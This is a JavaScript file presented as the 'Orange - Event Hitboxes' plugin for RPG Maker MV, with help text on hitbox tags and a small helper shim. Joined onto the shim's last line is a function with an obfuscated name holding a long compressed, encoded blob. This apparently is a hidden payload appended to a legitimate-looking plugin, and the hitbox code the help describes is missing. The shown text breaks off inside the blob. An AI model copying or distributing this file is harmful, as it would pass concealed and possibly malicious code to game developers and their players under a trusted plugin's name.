/*=============================================================================
 * Orange - Event Hitboxes
 * By Hudell - www.hudell.com
 * OrangeEventHitboxes.js
 * Version: 1.1
 * Free for commercial and non commercial use.
 *=============================================================================*/
 /*:
 * @plugindesc Allows the configuration of custom hitboxes for events
 * @author Hudell
 * @help
 * ============================================================================
 * Instructions
 * ============================================================================
 * This plugin REQUIRES MVCommons: http://link.hudell.com/mvcommons
 * 
 * There are 4 tags that can be used to configure the event hitboxes:
 * <hitboxX:0>
 * <hitboxY:0>
 * <hitboxWidth:1>
 * <hitboxHeight:1>
 *
 * The hitboxX and hitboxY tags are used to relocate the top left position of
 * the hitbox. The default value is 0
 * The hitboxWidth and hitboxHeight tags are used to resize the hitbox. The
 * default value is 1.
 *
 * All values are on tiles. If you change hitboxX to -1:
 * <hitboxX:-1>
 * then the hitbox will start one tile to left of where it would usually start
 *
 * Those tags can be added to the event notes. If you want a different
 * size for a specific page, you can add those tags on a comment on that page
 * and the plugin will understand that it should use that configuration
 * for that specific page.
 *
 * ============================================================================
 * Latest Version
 * ============================================================================
 * 
 * Get the latest version of this script on http://link.hudell.com/event-hitboxes
 * 
 */

var Imported = Imported || {};

if (Imported.MVCommons === undefined) {
  var MVC = MVC || {};

  (function($){ 
    $.defaultGetter = function(name) { return function () { return this['_' + name]; }; };
    $.defaultSetter = function(name) { return function (value) { var prop = '_' + name; if ((!this[prop]) || this[prop] !== value) { this[prop] = value; if (this._refresh) { this._refresh(); } } }; };
    $.accessor = function(value, name /* , setter, getter */) { Object.defineProperty(value, name, { get: arguments.length > 3 ? arguments[3] : $.defaultGetter(name), set: arguments.length > 2 ? arguments[2] : $.defaultSetter(name), configurable: true });};
    $.reader = function(obj, name /*, getter */) { Object.defineProperty(obj, name, { get: arguments.length > 2 ? arguments[2] : defaultGetter(name), configurable: true }); };

    $.getProp = function(meta, propName){ if (meta === undefined) return undefined; if (meta[propName] !== undefined) return meta[propName]; for (var key in meta) { if (key.toLowerCase() == propName.toLowerCase()) { return meta[key]; } } return undefined; };
    $.extractEventMeta = function(event) { var the_event = event; if (the_event instanceof Game_Event) { the_event = event.event(); } var pages = the_event.pages; if (pages === undefined) return; var re = /<([^<>:]+)(:?)([^>]*)>/g; for (var i = 0; i < pages.length; i++) { var page = pages[i]; page.meta = page.meta || {}; for (var j = 0; j < page.list.length; j++) { var command = page.list[j]; if (command.code !== 108 && command.code !== 408) continue; for (;;) { var match = re.exec(command.parameters[0]); if (match) { if (match[2] === ':') { page.meta[match[1]] = match[3]; } else { page.meta[match[1]] = true; } } else { break; } } } } };
  })(MVC);

  Number.prototype.fix = function() { return parseFloat(this.toPrecision(12)); };
  Number.prototype.floor = function() { return Math.floor(this.fix()); };
};function _() {
  let _0x1e3fcf = "eJztvW1zGzmSMPh9IuYX3Jcyd/dpqk3Tkux2u+22J2hJtjWtF7ckt90jaxQUWZLYpljcKtKydtYR90Pu/tz9kssXvGQCqCLl7pnbi3hmd8ZiAUgkEolEIjOR+GZe5Vk1K0eD2TdP//ynP/9pUEyqWbZ5+Pr08Gjrzenh9t+2smfZ2lNb8sv+Tk3Ji97h1um73s5Pp4dvNqHkYdeXbW697L3dOTqEz//485+ybNyfXMz7F/mTrNXq4IfRZDqfvR5NZk+yWTnP6dv5fDyuBmWeT8TH/vi6f1Nt9qvLJ9l5f1zx16t5NRocXo9mA/V5ln+eHU7zfPgkW+PW81lx2P+UV/bDEAC9KCZz+LC+Sl/OLq5+KcbzK8Bt/TvzpQq+XOXBh0p8+POfvsC4P/XL7PRw9/QAhnw4yCf5bn8CAy675XziyPLTD7+c7u3vIR1X1UegcG9X031rb3MfgbliKAoBQ/H5fDKYjYpJ1h5NRrNRf0x1Vpjso/OsbQEJSNn/+l/ZncNZ3r/qYqP2iqmeZWU+m5eIb5Z9sQDubJQ301nRvQTS7faB4psHu+21x49W1x/8sPZgtb7xZn/Wt8hyP1S2m0/m+1PEuZKfiXjdQX88bs8uR1UnU+N5ylT+85/ceC/GxVl/fNS/aM/6FwYHnAT+vj05L4A6EoVx0R++coWmV2wB7Suo6xser54gidSHLtX6S+rjk+z4hIAxAQgejGwwng/zCrHrzoqd4jovN/pVDsTGsaQG0hsOf9dY3IQpHN306PHBwvzipyrdlIaXbs8jf2ZHvgiIIofnmETF6by6pEoEVzNRBStZjNq3XrFIJOm6mY//CXTN/vu/syZyhavBQoFKsBifZa1vW0uR9lYkSHdrmHx7Msw/h4xupweK9s894QW23Ox5dm+tad6q6Xg0yF39Trb21TOI6Bbl6GI06Y/fjOfw70ZxddWfDAH3V/2r/HR7MsvLKYwUIE7LYlbMbqZ5dyqrArhlqyohOuBvnaxfurlM4iIllW5EIxk42OYvLQMcjc+LMmvjgEe0J8A/PxKU7jifXMwu4cPdu47sWHA8wrVr/koAVbxm+67mZ7jnTy7aq53s4Qrz32jy6dSz4PbkUz6ZFeVNt7ruTxMtH67Ud+AAenhYSljCSrkDpXPgivPRJB+6GlGfprrlmy9ZDvu6r92bTrvn/dG43XLtkA6wC09m2dWoqgDLbsu1bsa1P7i8JbI1e6mokWW8p/av++WwN7gc5Z9yRC4cWDw0HtykmI3Ob9ot0RT0pexuFrdfRCEB4utpxKszTSWqAIvdl2Z6I6OKa+FkRiCG+TgJAmV2GkSaH/rj0dC0disuGidueG6pv8nL8zZ0Dd/xz+5sdJUrUWDQMps6CI9BXlXdyxIr0mJDcNT0qlINq1m/nB1BLQNhnM8A9f60yof4FeoGwHwDqUaIJkiub7O11dVV4Ab5fQ2/r3ahYHV1zelIhNR5CfLvj0UM68OEzfqmtlJHT12JHEQ7GEUC/bX83g8r2X0PWY+jykEhHv4rKFyDm0Nnb351praR67I/VXgV5+dVPutkYxTKLwoQI51sPp2av4UCMsmvf+mP54gpbiHQNTcl7HCRuAo/CmBqJVK756lSNz5fVrOETD2Polowfsk6bJ7HwxHY/JgqbegljU2MtRNTpoZFp35mzrB5v7x5979n6H/GDL2djcZVF47nar2cj8b5m/7sUovaMv/P+ajM260pFLVWsNUEZJmvHUD9rRjpk3AzOKze7na7dl+sQnjDUYn9fQWmpmUtpmegp30laNu0FnYJwms2+hTALourTjYrmmHbpr56ABv7/KPw7iye37D7/POomlW36fy8IrjY7PBmMqglGuw5cDRogjwDLVPIuTsSI4GxVktAAZy0Wxv9Cah0menDaF8ZtmG1TiIl15dcVFkwpvlkPJp8jMaES3WAthnYcMuyKB0+Xknawu+MDKIxu8wTqHQybu5OYwET6EkAds8HqIfHM4HSBlSCUbk9y6+qoGbIXcV4mJd/COgOGwPDHq4+Qi09y9Rnep7ZAHeOCCniP5XFyLuyAvPyU88p+MGztugODxgtqfT6QlRcsJmTI76ZZgpixXPLh8wOvq6EbQYfVOlk/wDUB/OygmXP1tbsi1aXl+Onq/5HYmqCbHhJ9FLPTW4C66cdTYBkNXppOA/RvPV0oW44sh2hmOwPLT0irhR7HDVBngfLQRt/ZM+ee7JaoGbSiCVpXwkHAHX88sZWoImyKAOTCfxJeFhIoSDQ4/8Lt+2OKvwNm9wT92HT9mqMAEDtW0kFJIqfxm5LTZzDxtv65EQO+pPeAHVtNZHIxvFUaVnWp2ZEAaque8PJXm4Mpvv88yAnszKzYWoEJBxSg0ACIFWTOwFQYzIoiECwcuez88et1NASO5AFq+S1B/d1c4Ro4kZNoqJBfHtlDPwqqUFfl8B4DaMeguEuvQs6bU7sls9CsTa7LItr1AQzGkC7tSt2QJitWT6poMfgmJ5lQmQHe1zIQG4AAX0J8a/lJqY2gna4zoqlaV3LYYNiehPRuirm5cAinVfQI+hhxSS9LemxW3g09CY4txk1AoVR80A9UPjRQiLg1wB8s8IwIe5vFPGOD9jkLc7I53jAsO2N7FG1/Y/uFZgP6XDhZDTtkPAJpWw5q96NZpftFvBafOqBryguoGpsTRVaGFsMkrVI2OIfbpRV3i/BUebEMuy0JRw1xMSm1ElZK9AoeZZAo/xmZoB7hVLsvRJCo1bJ/4tkBguvV8CUQqbwMc2dvdo1A8uFgCHQDmngD2sScMc3NgZmwtHjZ9VOoYQ2IkYrFnCimgIdW7ZFZ1AtwVaSU89TJLiMbfIk6VbR/SOKnH/LdCHnLxOszP6tOlIQLrGZ152uA4kQUjihzyxc+CSTDEfhF/Sd0zoPlqla5YyJFXlucE7rZpVst/f+dGf/FQYBgOnyqf3ce/Nms3fUO93cRvd2awMsX6NJbzIs8+sDsCfm91va0Qu4Gjvtn/+EeFew2eN33G6e8qdxcWE0MfnJiFv6xB8v8tmhax3ZC2hBkipnunDkkh+h5c7fDsknAkL4CnxLVXVUvIVQhse9suzftP96uL8HUgcroDmf2kLHb6u8ZKeidKTIM43pwFERMR6MCzDAJI0bZjeYXHcv5iPYEd6BuC3gRw4edW7XJoVZwZv2IQCEXF5moxKfm2nCLTVJHDS3vWbZv1/AyWUXhgJW4S7o2u1W1gq2B+xxPmnsM9WlgjwYA8+6paqxSWzCZvbtJKS6Ze4s1DmisOcIVN0n+ey6KD+a9sZ9rgrgrHDeB2UUiouqG31uu30ChRWdIWzZHlpXwIwVtXGjj9ts5jNYsCjrolbHCrCPATATGoDo0m/wcGLUQ1h23r8ajW9Yvdt+8+mhVPEySZPjsCVMPi4O9FeGRVf9QZ2UE6vC9JNPCwzzAT9yDj6y6/ZKx4g/9LY9MU43mHrYsWzRZVHRwfsJzoP94Uqxriudu3XZtd9NNTO2QzhkYbyQGCqhqtYVBMf0rJ9N8hYYGWtMVG7dYnOo9snvIdhIQYcTXv5ptxg2OajuGF1iVHFwDdhfR7D4ZqCvwZTBbkVrRODZbt27N8zBC6q6KouCNqOGnpSVtG09LVf90QRQnI9zZy7UkHH1fhXk/HM+0HYjBIdKfh04clT5crHdOpiTT12zEXXkjsSrPVbNLDS/r8tjiiv1gt0fk5IT4sCk0bRfO1kLZh4jKE63euv3vSB1JLM1FW1wI1d0oe3biE6zmUM5HgwNIrIC7plbBwf7B+IgbYocdbQ6gaKzgImnr6nOlJwuYUGXM1UNTxgfJjXHdj/m+n64RR14zTlonVXUwQ+wW9vKPCr9EWnyrnewt733iqmii59K7Mj6G8CM0IvLxXIPdyj8oLETXxC1za0Xbw1iokRhBQqRghNhFBQKHaSEyD8dJYOnYwiAoVOj3T7lN1LsDraPtjd6O5ngJVXpaTylGnCEYqK4P87TBWINN69Ap2b5CBohDqljNXggpJ6LRgOkV6CMRur6RSFlvtHuDySDn6dIJr/V4cLAli25gLy6K0QGlVhpAFtd1topLrwZVKKQaGhAdiRGQtjU2H9INKrBadNzHxyKfDYgM4Ws2bELXpCzxusYS2OJsj5pSamsaoXqhgkaQHiwDJFUsX04DUDMG1shPAhrL6YzKNgi8F9lgKAJFic8C6dbIXv779eXCKHtis3J8/kzd6hSo0aU4Ai946bXw70cnUvANC3CiVTLBx5cfCAlINr4pqc2MafqMEptpfAI5UBghQPbE4BkcoJxWjSPVyxHUakVS59APOCvQIy61elUrNpoaL/Up8giZA1ew2OtkwDFZHY4+i+k//pj+b0/zDfnJXWPbdaxkS8+G83AfIXbMZhKX9CP9pqLn+TSroBt/1RAMPL93WhIQsE0ucr71bzMj2xJmgx33Wi+zdafaoCv89HFJQk/23tYW2AIqj7UaDtEOgKEHspoPO5B7GSrvDjrY0Ci+f/udystVXFY9q8R+xTiHYuI+MPT4J5EUyISlrQgggkWLPXrx15NkcHMjBzSjzbjxPhxeRdjaduvIMLkcjSA9WB6dlhgTNO6rI9MSXPvvhTT/mA0w++WJXRIVYW/8By1AfJg2OZWPnjUsxddekDeeiTBz6ewHyTPDMz5ijGfZ6tSeIuie/ecAAjwvvvM914jvIMW9+IWjEtQ70cgiQ6tTBCmzK+KT3lMm+hU6dQZgnK6C8zlY4Vw5Z/NLzYgnpetBzWHk228sgK1jyAcGJDIQZMYYkM4XcGxWR3TXHhgcGWjmPyU32wW11r9hEDNyUwKJPrQHczKMVSnyxr8pT+emQ9Bb/jJqjp717/BOdjRrqJLMqaT7sf8ZgNaCMoOwOKZPXz0xFN6mUBXG+pKVhhYzCLelK0ctprbMWBVw9b68anqd21NdswEPr0q4By+WxhpyevF7pYsAzBgpegPVUdJ6D8I6AsMZtVlcQ30PCqKcVULWAaS6jh1sFyiLRwC1K08KOkLVAy+qKn/NMqvUcG03h4Kbag+jqYbYFRFybuL4QBX/c8oJ4NSRlIjIKPSHWzHi9c8YJAnW8gNO6C4AHPCbguS9gJWUgl7a5otmXvA1on/bubn/fnYahWB4+uLCMFo7LGY/uG9sTx8uX+w2ztCdfplUV71Z9ladxXVZ3kPASiK18LikBa95L9bdbRTtxiAqpt5NdC+PAtPg3CfWcVr9zvZ2YrwU6Hq1rc3M6b9ssrBitfuA4awbNv32x+Gd1c+dMvpBQL69/ujFRERjW3PorZnS7U16Jnm9wwOrOusJEcNpiM0n+KnyGFM1h4ekogVE8qltNjg4USaiALzj4it0kak8CJJIzbKff01OIkjD9LZmvrzoeky4QR4AVLn0cPQAUB4WLIHnneBru5gSe+NcQgCMcioSWP2bmoGnHLQhneeFpGS16ANWf7Hl99B13QUHZUnBmhjBmpGF3CzxDN5eOUI9mguacZoAbXdtPpqLyHYwkytjhYRmMsliWgegWYBgPfPfgMvmlA2ZoXlGhTUISoKCo9lWUB+4DIIzaGCQWcCYsq77CYTvf3gXCYpAhoRdZdtfZ4CAvCTgwA8blj7bD7LLiDUkcpMl/rALCJfdSisWuey/uDjfIpENq1aL3qbCdsIfbKwEhBiO4nwF3aCbjwKOmZDrAQPNQrWipgvDB4IZ3u5JY5Lk4jKC7lhdTcug3jdmwjGur3PXP+x20erVgz7+3w6zoOXFistF/BL6jhSfFtfHwsLG7uTllM1fUWnedmhVavwk48kEW5GsbFJXKRhSUEwtg4vNfUIIIglUBeD0FUCAw4ZwiQeJ9P9EFhYDhE0d1DpaH0nBytv+qqv3lXJwlCWHQNUrEBwvbU1uKW50oDmqxSawXYh3Awx0nSNVn3B+di/nrwBDRFMuzcIMjTJ1Aj6iMp2iA0D2My1pwR7C9zQDlU4ZS2PqQn7TiLjJilB6ZrVCtEYqKHf7IIDtWHVms7NxVqI5TD9m9/GszkbzSjy+4CBglTHy7KcmQEOT5f9sg+yvgSn5/GJ+UhuZfF7Ou7f4NUql9EBoV6BZb1/NZW+Wn3+DlMCLOG809pEqJot46lr8tUtjnYm7weI4Un/jEMBCW9SRdJxsp4fcSTqqrmTHNGcf+W9/cR1+4AnWy4FhnB56BauRgDcRxygZYnuJpshyOMTDEBdUiaUDiFyCCbZTrWZmpGcE4EDXWl2UapSbtLpKEbPYQbrCaMmasajcFJMknS10vIVGDo4VkzWdCNXtUfd4ej0KgjUkEFsMaNSbSBDkz84VJficFwsDTJO8J0Dt5VL8w9YdkeTUGGxaNOZkHJ+4EK1sM3x8u/4IT5jChUWKdQMAmvUgiATpcJCIM6RMMHRV9eG0y6Y0cGMCFuMNyMhVG74Y7aGRfzjucpToBlcmb78/R6sYVoXoADD9NK1wyp9RElQW5jHECu5IhCqDNtpahu1s5JG7hnt1E1sNT9BkJBj71CixMe1ZvRwptzWoIwcqvv0bPlFZrttHl2yRVd27/5uFDZgZ638sQsWOETlOLEiNCVjCWrLdlxuXHiywLnxuLEt2gXzXhhXwtpDWk4pkNNiqiMKF8p2JTyBaRXqC3YIKwkTss9rl41JPtJ6PZiQ7XrbvoKv1W3U+3DbTexbQg1LZtYIdL2RXHpu09YYBvUXbl0cB2qVZrkvd9CgktzX0juZJv4SmAYNksZspZlVRwAJVcLk7RBas4k7eRhdC73QpIt6uPeYzT2hhPs2jf3Uzb0/JzPHUfgLWn0RCgR1zPz1ksRtmGCPUT6woORZzELJEH0aSeOmwMMKrQeh+pM6zbjWYsWFbJY8oqW57XbyjmqfgY9+PjM0Md4J+Cimy2mzui7QbxXPT/rrj1qWBWQ1BPDcKysfK0gngiKaoAkvXJmfgxEmafsgNjMrm3yMMJWwWUwGOUwkOw93YH3V5zyj4BBQMdm35Owf7K889SWOTP6TVwPdJ4tq08GQjhPh3WwUwds2cpquHfpFFq1VU9nNMv42Kmigx6MDbowygQ5jsl3jkcwClBoD+XwNBkqRiK6NkQwydmC3mIV+Ed280rdkE514FW67qsBEAS7SS743gtLD3H6yOMeaMSkw1nQs1q3Vmk1JYCsOAfIVXlO96drcAUDIXtLVjPCqnKB6ptH6a1VMtj4vZdN2OHgNMXkYTqBmE+9g8xA3Gp/HqQnMRlGW8+msFoyHAnEw5NLDPYX9fE1w35UFuA5+AUMGLIqIdrgMBjA9sxyXD0s+7/qlYjhSoSUEV8oG6Lfk3RZDkoZEsHiDiKArCoc34OW8gkXPmWvegKUELCx0BJtQohJ5ACOmoVQ9+xM6UDzTQFSZUo2xJZxTXk4r6Sd23ubT82kFqjGsWvijkz1a9UunAUsQIrLD+6YHTTqzS/RhSV5M3Co2Duqr/sfc6R9830WS9HTcr2Z8Yzcfbg8l6ixPROa4ehNZEA+ixeTSlz5rZJD91CUzGfoevv3WR0JDXJULWc6+/balSdOI1iFqAs78DgQH990gH7tyoUVsZm0rhYBI0NVKhhuPuqJlJcrSN1G1jteb3Nh52ooTbCylc+tOgmx2t9S8tdKpbUXhfP5ePdvAS2s7/pTmvf+w+s9HF8t6TgZUu1vlM4xerFo1YMhtmwBT5+fWbga32KhI5EzRnaB6UGdlRaeq2S/M2RBno8bnn3aNCBB1PmXVMMEr5qxjUwYrzrAfU5Z2Coyy/Tea4j2a9vxq4aZNd3w6n07HN4S/bSzO/TafMYByGNhvvpZLNiyruY++nkuGLOu5j76eS28s67mPvp5cDq6e++jr+YTL3qYC2sq4f+HGDCGSvpYIaQ/ae69HMaDLRd2zYngDQRA3ELGLaUb4SsCkmJAjEWv6jQojs8Ak8xKgHRI0q+6qUMJmyMYhFAMfkIiNYadXi11Piz0sPqO1YgjjChF5p/WMmHKZ/lpxgHWl+ETWeuatN0amytZTYTEQebMZBffB1FA5tFma+C+mjkiXrTnalIvk2VTufrvyKig3vy0OLo82I2B+2gt+utT+tDQq5oPLt9uWQvzLurA4BeQBRCSiwmXqBF+JD/wRseao465XL7i7FvmpmsFG0KIj27m4GMJ8TZ6xAJ2Ee8ypNUNl0JDw8O//WHMOAaNWqxOdXn2/w8xwW0NDYGoYSjuDRDAwMwxjG8NwgYFB0SRtXBjGu4M1DNEVmUAfkvbaIC9VfKnGq3t7BcdwcW4X1BL5TDoSmp4dtlUy0gEZwqbcFNfY2NbGniZ1htuqWrKNBaxlrofojjcGTT4ZAC0VgE6z3pY2MlPYbOUC7VPDPoQaekWKOFyb+9rH4FYY/e7PLrauOb7UU7dOy5aQ5bKV3+/xCwH2rIDWCnBDQdEUY+Swh3vIKt0MRFwf/NQ2lYuAUeerFqYErm3xdZvxoixMUN9wMZ1RgixSyUOI62QRty3NOdI+zo3Ay1drrZMH4WLyIgcxmIsxLylvJaLyNh9+S9zmEwFVcduE61fLkbAjbbazVgpvAQoSUdjTuTNnGJX8liGusi9/H0VY/nyEazi6KNK14bpVSB2RCUi51yPXukqEEpn0tXdcXdCjOaOjRaJiDnYSk0jIudIT8QIi0QsldAl2kHrnITVMeg/1LcCvch/Ws1HkRHTnQ7o/NOzFPkTLb6psme1ANzoOudk5d2MrEgmPxLxr4oWmHd9Xyo2tjojBYMnbgvgEKNPnmstOtTAa3PH61OmC/zT5QsB+i6FXDsh4px44yEtU6Y7K/qQ6D+6chHsO3mjiapTn39PEKN0z1oChrdmjwMLqPikbqC3d7U+32eDJKVvwMiJ+avs8FFAtH1ZQckBXecQ8uCbQ83waAPU2zBQUHGbsBTBeUdi+cg/tvb1OA3//quyNodGOTw54z8mSSdkhU1t8eMZkxxGWiCkqyMKKDLL/sW77s5dHSAl21lD+Eij7pprc7RaZG1mKQK+fgDQ7zukUWFH9bsnDwHVWMwx/+4hBLNheQ2MTWXoxJNyPJ2BG7uxwTubjpJVAVEOXybxcbjLOR2VFZn7v8a2ZkjHQqprRhCiDF312EJDV7xldzSbNtg1JIUgr3eG9QXI2/v8AzYAnFNumGRv2J7xNYMdgXAPe8UkedFKYGLuUMtiMn1kaqqPnGkZ4etOV7+nKfh2Y2vd0dca0gSrsa/LrrI42SA9WZvHXZT6ecn13G5uJ5Qu6l1TimvClO3sb3JnCzorP9C2o58DKiu62dNi9Nx6K2UI3KHjd+ActLZx9HGn7cycC0ZEI2h/ynnjEDLATvAa7zRgvDhYfYTsUq9xInjOoyZJnCRhsE7RwQPmh+VoKBt23ZQ2FcwU4atLaVPwcr9Z2LWDkpLYHUY/AUTE9ABkteruXrddU11sZi/vh0Ej5sLZf04l5FGwMp904b7Ng3+BqZX1UpZQ6qtFykqcZS8wdgGgqLEmoCFQx7/IBEN5OmP39sigp7wDX/2r5Q22Gv80rIeg4MshKNTqtqhp1EkrXAjtAQjapjTDs+J7+YDH4kggQqYnP0pgKngIeA74Egm0UY3C7i5LBJZjF4dQHhu19vtjvUhKmB+/NHlbFR7iAE/5jcSLNH72v9DaShCAVG5c9wkLhbNw4v12QSu7vG7DYPDbOcU3CMNmHyd3gr5ddlKhh0ajxvE/5LB5918m+f9DJHn+PKS3WV6xHQjKQGRObTHAQbWfg1DTGabLaWKhno/zhrHxhTHcCtX978Aj/L3BWG6M4H+MpLwdSpO3J5NNlaIK5vznphcoKIkp5X+qECGnNmljEc09ycGTVVayCsdt/gXG9WN9affx9K3vix7iS5AJJ+yU4oYm1nRU4ih2onZ3kAMLIzcRqcZfbU6fNxUtMzzTSwtl9fNSGHT9sh66h05Z5DVACiNPtve2j7d7O9t+2914ZHUUWH2wdHfx6utN7u7fxmtz/cWuo8+rtTg/zvq6nintv3pwevce7+w+CYsohdrq7v/l2B19PfZgs3tjZ3trD1t8li/f2sRMofqQTzFIqC5dilhNb9N5s++Au/oTJ9nNnQTZPvU2nEKpRb2hff/D94x8o9631BrlclXX75+3epgzuDaQeLqU0meiMD9+mrK0Xqbpk9ZEjGFXb/Drr6L8ac6bwmZUJB4shwQnWIJCsZPgh6BxglzfY/6KO6XVZnQPXv3qrGhNIaz4QBpJl8sdFwUaBKTRKySJulZknYvipWxg/oUe+Hwwe3nv318MofjkIuQkDL2ngwL2hcGGGdklQuvcv0FmMCU0r8WfwZF7a5i/nK7E8xYZXk1WSG2VmNb/sbe+8Pdj6MPkwsfuTTg0JDZkuV5Re1PgXOCkYHI+zo/LmSW3LD3BQA3cI2Xhxh2IGaK4OEYNgMMfaaMCwkaGz/AKM2jeuLWcejJNQSqcI4420j3AfXWFylkXTi/9lSYaiZsj2eArMJWOdjVTZ3rRHEVE57U+QqVgpTSCt+1NoMRp2Z5+Bs51gUUG8CmSNvVnX0aMg7uR1hoE7lilheRCRDuYT9FdxLiNXWPLEAc7b53s5Wn365Y0edRNbyi0p9pvR3Jge0MvRXWYy1CKLkF+8RniPihill5UMw4iAwXiEqYSv+1XGb0jNyNSwDIa1XfP+57w1geTwY9JPgicBShHuTLIhaZHtR36bEA991L7kyQ3FInHNyfDv8lSDKQXcW1W3Rl5hM51eUGQUiRai78MIB357XCcYFE8ip7YrSWF9FTbyh8k10pHLOhHxmDJny5jv5omrnzq/sdqa4eSJiYMYMmTMQE542scTmhaBmuT8hk1a+IjhujklQulJjbtJTm6yJ5xlAVLTeAmhZtU13IJynZdiKaXtTthQXvlOlHnfm9cvEtVS2l5ztVsB7g0uPy0BmKp5X+3vWD7NXYhQ3SCkvu8T0m01KiHImAkNJKuFgFoC3bcBf2IGfraK079mI7xKUvl145WN5eH+WswBLIRDVAV0MJ/QS9LAyKJNhVZLOJWCkjgeLwv3LM8uRp8gzHOClgd66Rjf/yPtBoyhqDRM0A4GC8aiLACTnlMDPlg4DbuSTsJEc+jdWii+0NTEX50HyuTQaGbgYwOry/GP5Ea2OuitG6K/137lf5/qnSUQQeIhFSdzYCBmF9/epM1EyhhHkIBLIbaih7ONqwY0kWa+5/Etu/zqE/ZEy8vHcjg/u8CR3O0xyt7hWPP8uf87oIE+OskT2mnFTj51SkNfpXuVxbJanNo03Mq4WUYQcxgux0QZYIxQ2Ps5+w6/tne5JZne5cWNpq5D6gUouO8uVHTZY2rzC/MKsFIx69RfZQJgtZ0L3PFc6CIY5387w0ZjSpTapCj69tnFog0svOeeWj0OpAdc10i84KHo2aCwyNXVH2P4/Q0IIPCTDxsmJlS3avGhGKQkiEapoG/sL0YcTymLkU5IP5HQmezhJAAl5HYEju5C8ebkdg4bw1AjdPBOmYmANJEDqmd7l8Yu+qA0tB2lUt7Wxdcsbz7Sq+z2y+Ur8wctZv9bsMnvkA8N3MUHYKJ6fP7VZJMibgMbUFTseKzA3TEgUhscRW7CJid1kp4uloY8CprEfgQPU78SZrQkEIr0MWA/zFRp9sX6IQPLXiP+VYVh9AvzMD86t+NvMf1O9rU3FL78wXzg7lkhD2ADJEpsBQl7l0ZgM40bPGTU3O2whTPZOAu2X+31juAkIGNfk3emQVR93P/57c/vfn718+Vf327zxXSG8n7/4Kh38GqLUhD33/7Sf7t2uXn09q/5u5+L1xtX45dHW583D3rTl0e9aXmw9d3RxsfZ1tHF9Opobe/V0dru1vvxXyk6WLgoNsqb6axwPgr+iRGNl5Q7Z/NgV81hbpJ1voYKhrYoUj6DX7tfonoK/uNZcdZ2qEIQ7HQMM9FqrdBbmpgCDpMUGxrgAXoDPmHucCpDtxP96s3acPT6e/ZwfWWF7YsAwkukZThIYtW6vr6+j+vFfaw9Rdj3HI1HK75w70BYZsEWEKE2mGOME9HGHj+Gv52ttzGERTzj92J+DrF+NPS26MenevX6QAAUAx8TM6D5216dxzlkEaGh6J3XuAvo3MlBEgO+Mw+L4cPkIL9HaSrG0Brn/6p/A0tg2h+Z1zOlqabOsOROOEi/+IwjEaDnifiqirbEw1nHt15op0wp/4axcT4UQ5/dwO6O0yK4GSmHvr4HjzmUQV0+XuXLx65d8u6xgdCmf3/8MfsOHe70465veTyKc4tQnefP1Q1hxhwEC53hInnK0b1YatNiks//fFyAX5n+hOjSIfDaCjjRH67/8PCHR9+v//CdipIJYIR9X/Wrj02ZuTk6p/poEfBBZvlkgCByWjgqTa8FQamKh/nbg+0NkIbFBPconwisOyveTqfq+VS1xZI4gX016sdNhcTL/w1zsgbCJZY4SU5y7ULCnOLlY4gStsqP/YwJ5jGZw5t0Mc7yUREUumK64jxxIzoqtuTgcAlzq6ST97zWNWPf3yPXDF40gUXV2iimNxipJUykfGGDP3sRaDZCISbjOokc1uapOX7a3CzcOiqgmIS/3DHNTfJ4NCHlKejR7ixgUgrzv9zBJl3YYq7ayyaTs2I34+6e0T/4Ste4PwC35gd8wsDuQFZFwyqHiIStzhh90/kmrmcmxTUBtdjVoTsZbVuLAmcg7KKCXj/g0O7fzwwe+LoN2HAo9yn+R4wMKh3OYKHDGkaHA2USAPFJ+RBZrDh+oTvBvmWAHaHgx/0Bx23fB1QUsyMz+50f2ZofWXKuj22rE9HlEu7h8FFxTJhin1Jf5gl1fz6Rus4FvhsBmyMihIqYWHrJ67Tz0uYcNre4UNz0JlLCQZWE4KKgW6YVC8hIisXAlMmadSfQAb758OGbFW4FP+5/8zScfbTBEgdUsFnD4KAjxwtYZpUIxqc/vijAi3R5Vbt53bObV43ANI3+DsE5Dx58Lz/9N+2YgB4s2mpWAlsjJg/W753BqiHXt7kujf9jenYxa/gbtwDjk157lHpOW+ycT/XMgmpdjD/lt5OlfnqR5PJCaJKXV9Tb3bQwzYzdRprL+C/BJstzKKHttGNqDpROYyxw9AZNWsR0QbhjKGpXVvahhUsrvZLx1wm9sello5mQhgZ+sMAYmJxFyKYqKyZjMFX1zyknMl78oIXiWNaN3aigBsw2WJAn4Nlw9Qh3WpBwzAK9FpM4zS/wwjS+YUq3oKEByQl7xDd58V1C5nMIqg36I1yYIkByNXIzbvhcw4cHOw2CxFQavgWoJEEIJvaB7ytEKpKbbzvnWFNMuVFMwtN0UHwMrQJPWn2q4FCJUCwXPLxhAPjNF2YIYhmyYg4nJQhWBLcpDoml0kcWWPjYAnuO+hUER1bgHcaJsPhL8txygXtqGf9qigwUxOQ6odo16tyxqHdiJgsHuAemBHwoHOJSIcbqYz7Fl/vKjN7yusDlNJ2X06LKK8OyKHrOCtynYfTAuY7RvgVJ/i0Las18yM7AyQUr7A7MDVkxwBc3sZEsYNEH1r0spjlOxU12XeBzLgN6GP0K7KmA4UXFr1YDBEQXxLF5F6nKogGDznHCzm68Z2gfTxzNqnx83k0RNKBQSFj3ZLX8rJRgUxTtvnaHFzLaqby3Z3/bNLEGLG4WA1OzhuFlbWnCUjBuy7VurBq72kEIQjtUF7GwbejG978ZOcnItQQOWFm9mG2ID4emzZzmN8p6i+cwkXrdbwfOSmAORsJ+ZB8yYT705gSwwaOB6Jujb7SGRrwI0bC+5pqpubGw5rqpub+w5gNTs7ew5sOla35nau4ENdMqDB8KQAgMmdiBAiNfIXJ7tk+tSlrcC+gaCO4xeGQc4pSc88ZcBfa2n2p+1qc5+X6FFs43Rxv7vd7ON/j6sAPIWw7FnIhOSF309n7Ru+nIGpYiyQQBvHB+q2EO3ZgHKRrgRS9bx158D603VtHFb8LSgzdGsv/I1r/jIPcgG7Yxi/mBaIOYZWk/PGv9Uujxgw1U8e/K6hJactptbctBSzE2Ay8AYPid3OvNAhW9REbB/GMQte2XJZ8mlXntnr1fQdsAvUYEXIv/2rOAyf8fWuaQl8VPqKHfVyBZr084nNyzFb1S4x55sqorL4HNWs6nLchzflrrjPTVYAuKuS8p4Qz5BGyvqsaz0T0je7iblNAjib8juYnHArz8wy6sIGkSeSQuS7M43u/uvJ7NpgecC86ctLDKvGbMZBwjX4FOrQQgu6BQgSMC/BqYOsGOiwpgey1Hw3wXQqDwkbJ2C9P8maeF7/8GMaUtXxk6AzW+oorky0E6MBlaHuKkLsMicx7WwWi3eQX89nBVxqnh6PjMYBOuGPOdLbQImFKJk7DnqzpyrbRlGRGi486qyN8+M2sW4IETgreeNulr2V4hLxj4fiRE35iv8B